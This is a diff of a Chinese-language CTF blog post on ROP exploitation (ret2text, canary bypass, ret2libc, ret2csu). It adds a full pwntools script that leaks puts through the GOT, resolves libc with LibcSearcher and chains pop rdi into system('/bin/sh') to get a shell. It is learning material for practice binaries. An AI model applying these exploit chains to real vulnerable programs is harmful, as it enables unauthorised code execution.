@@ -9,13 +9,11 @@ category: PWN
 tags: [PWN]
 ---
 
----
-
 PWN中:ROP使用方法
 
 
 
-## 一:
+## 一:简单ret2text
 
 ![image-20260304185547856](/images/image-20260304185547856.png)
 
@@ -75,7 +73,7 @@ io.interactive()
 
 
 
-## 二:
+## 二:canary绕过
 
 ![image-20260306130710599](/images/image-20260306130710599.png)
 
@@ -189,6 +187,8 @@ p.interactive()
 
 ## 三.经典ret2libc
 
+程序中要存在put这个函数，这个脚本才有用。
+
 ![image-20260313184227163](/images/image-20260313184227163.png)
 
 ```
@@ -227,6 +227,8 @@ p.interactive()
 
 
 ## 四：ret2csu构造rop链
+
+现代版本多不同，这个**部分仅供参考**
 
 ![image-20260319205249477](/images/image-20260319205249477.png)
 
@@ -305,6 +307,110 @@ payload3 += p64(main_addr)        # 结尾逻辑（此处其实已拿到 shell�
 p.sendafter('Hello, World\n', payload3)
 p.interactive()                   # 进入交互模式
 ```
+
+
+
+----
+
+
+
+## 五:依旧ret2libc
+
+这份是经过修改的，首先使用前，依旧是需要程序有puts函数，这一题主要是当题目不给libc时做的，上面的那题是有给的。
+
+这边是通过LibcSearch这个工具攻击到的。
+
+泄露一个 libc 函数真实地址（常见 puts、read、printf），用 LibcSearcher(符号名, 泄露地址) 猜 libc 版本；用 dump() 拿到该 libc 里符号偏移，算基址，用基址 + 偏移算 system 和 "/bin/sh"。
+
+**注意：** 只有一个函数的话，LibcSearch极有可能会找到多个版本的libc，所以有时候要多用几个函数。
+
+
+
+```
+from pwn import *
+from LibcSearcher import *
+
+context(os='linux', arch='amd64', log_level='debug')
+p = process('./pwn')
+
+elf = ELF('./pwn')
+rop = ROP(elf)
+
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+ret = rop.find_gadget(['ret'])[0]
+
+offset = 0x0c + 0x08
+
+payload = offset * b'a'
+payload += p64(pop_rdi)
+payload += p64(elf.got['puts'])
+payload += p64(elf.plt['puts'])
+payload += p64(elf.sym['welcome'])
+
+
+def leak_puts():
+    # 先吃掉 welcome 里的 puts 回显
+    p.recvline()
+    # 直接读 6 字节地址，避免地址里出现 0x0a 时 recvline 截断
+    leak = p.recvn(6)
+    # 把 puts 自动补的换行读掉
+    p.recvline()
+    return u64(leak.ljust(8, b'\x00'))
+
+
+def resolve_libc(puts_addr):
+    try:
+        libc = LibcSearcher('puts', puts_addr)
+        libc_base = puts_addr - libc.dump('puts')
+        system = libc_base + libc.dump('system')
+        binsh = libc_base + libc.dump('str_bin_sh')
+        return system, binsh
+    except (SystemExit, Exception):
+        # 新版本 libc 可能在 LibcSearcher 里找不到，回退到本地 libc
+        libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
+        libc_base = puts_addr - libc.sym['puts']
+        system = libc_base + libc.sym['system']
+        binsh = libc_base + next(libc.search(b'/bin/sh\x00'))
+        return system, binsh
+
+
+p.sendline(payload)
+
+puts_addr = leak_puts()
+system, binsh = resolve_libc(puts_addr)
+
+payload2 = offset * b'a'
+payload2 += p64(ret)          # 栈对齐（可选，如果执行 system 奔溃就加上）
+payload2 += p64(pop_rdi)      # 弹出参数到 rdi
+payload2 += p64(binsh)        # "/bin/sh" 字符串地址
+payload2 += p64(system)       # 调用 system()
+
+p.sendline(payload2)
+
+p.interactive()
+
+```
+
+#### 积累：
+
+```
+puts_addr = leak_puts()
+
+libc = LibcSearcher('puts', puts_addr)
+libc_base = puts_addr - libc.dump('puts')
+system_addr = libc_base + libc.dump('system')
+binsh_addr  = libc_base + libc.dump('str_bin_sh')
+```
+
+
+
+
+
+
+
+
+
+
 
 
 
